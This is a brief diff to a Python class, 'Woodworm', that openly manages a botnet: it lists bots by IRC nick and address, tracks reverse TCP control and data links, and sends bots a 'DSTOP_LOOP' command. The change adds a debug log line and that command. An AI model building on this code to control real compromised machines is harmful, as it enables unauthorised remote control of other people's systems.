@@ -181,6 +181,7 @@ class Woodworm:
         for bot in self.botnetDB.get_bots().values():
             info = f"BOT: {bot.get_ircNick()} {bot.get_ip()}:{bot.get_port()}"
             tcpSession = bot.get_tcp_session()
+            logging.critical(f"DUPA {tcpSession.isActive}")
             if tcpSession.isActive:
                 info += f" TCP connection: [active]"
             else:
@@ -240,10 +241,14 @@ class Woodworm:
 
         connection.set_download_path(self.pathToFiles)
         connection.linkType = linkType
+        
         if linkType == tcp_services.TCPConnection.LinkType.DATA:
             tcpReversedSession.set_data_link(connection)
+            connection.isLoop = False
+            connection.send_command(f"DSTOP_LOOP")
         else:
             tcpReversedSession.set_control_link(connection)
+
         logging.info(f"Reverse {linkType} connection established with nick: {nick}")
 
 
